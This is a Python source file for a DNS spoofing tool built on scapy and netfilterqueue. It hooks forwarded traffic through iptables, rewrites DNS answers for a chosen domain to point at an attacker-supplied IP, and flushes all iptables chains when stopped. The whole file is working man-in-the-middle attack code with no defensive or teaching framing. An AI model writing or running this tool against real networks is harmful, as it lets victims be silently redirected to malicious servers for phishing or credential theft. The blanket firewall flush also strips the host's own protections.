import os
import netfilterqueue
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

class DNSSPoof:
    def __init__(self, device_name, target_ip, target_domain: str, spoof_ip):
        self.target_ip = target_ip
        self.target_domain = target_domain
        self.spoof_ip = spoof_ip
        self.device_name = device_name
        self.run = False
        
    def __str__(self):
        return "DNSSPoof: target_ip: {}, target_domain: {}, spoof_ip: {}".format(self.target_ip, self.target_domain, self.spoof_ip)
    
    def process_packet(self, packet):
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSRR):
            q_name = scapy_packet[DNSQR].qname.decode("utf-8")
            print("[*] DNS request for {}".format(q_name))
            if self.target_domain in q_name:
                print("[+] Spoofing DNS Request for {} to {}".format(q_name, self.spoof_ip))

                answer = DNSRR(rrname=q_name, rdata=self.spoof_ip)
                scapy_packet[DNS].an = answer
                scapy_packet[DNS].ancount = 1

                del scapy_packet[IP].len
                del scapy_packet[IP].chksum

                if scapy_packet.haslayer(UDP):
                    del scapy_packet[UDP].len
                    del scapy_packet[UDP].chksum

                packet.set_payload(bytes(scapy_packet))

                # ip = IP(src = scapy_packet[IP].dst, dst = scapy_packet[IP].src)
                # udp = UDP(sport = scapy_packet[UDP].dport, dport = scapy_packet[UDP].sport)
                # dns = DNS(id = scapy_packet[DNS].id, qr = 1, qd = scapy_packet[DNS].qd, an = DNSRR(rrname = scapy_packet[DNS].qd.qname, rdata = self.spoof_ip))
                
                # spoofed_packet = ip/udp/dns

                # packet.set_payload(bytes(spoofed_packet))
        
        packet.accept()
        
    def __run(self):
        self.run = True

        while self.run:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, self.process_packet)
            queue.run()

    # Starts the DNS spoofing
    def start(self):
        print("[*] Starting DNS spoofing")

        self.__set_iptables()

        #sniff(iface = self.device_name, filter = "udp and port 53", store = False, prn = self.spoof_packet)

        th = threading.Thread(target = self.__run)
        th.daemon = True
        th.start()
        print("[+] DNS spoofing started")
        return th

    def stop(self):
        print("[*] Stopping DNS spoofing")

        self.run = False

        os.system("iptables --flush")
        os.system("iptables -t nat --flush")
        os.system("iptables -t nat --delete-chain")
        os.system("iptables -t mangle --flush")
        os.system("iptables -t mangle --delete-chain")
        os.system("iptables -X")

        print("[+] DNS spoofing stopped")

    # Sets the iptables to redirect the DNS requests to the target IP
    def __set_iptables(self):
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")

        #os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
        #os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")

        #os.system("iptables -t nat -A PREROUTING -i {} -p udp --dport 53 -j NFQUEUE --queue-num 1".format(self.device_name, self.target_ip))
        #os.system("iptables -t nat -A PREROUTING -i {} -p tcp --dport 53 -j NFQUEUE --queue-num 1".format(self.device_name, self.target_ip))
        #os.system("iptables -t nat -A PREROUTING -i {} -p udp --dport 53 -j DNAT --to-destination {}:53".format(self.device_name, self.target_ip))
        #os.system("iptables -t nat -A PREROUTING -i {} -p tcp --dport 53 -j DNAT --to-destination {}:53".format(self.device_name, self.target_ip))
        #os.system("iptables -t nat -A POSTROUTING -j MASQUERADE")
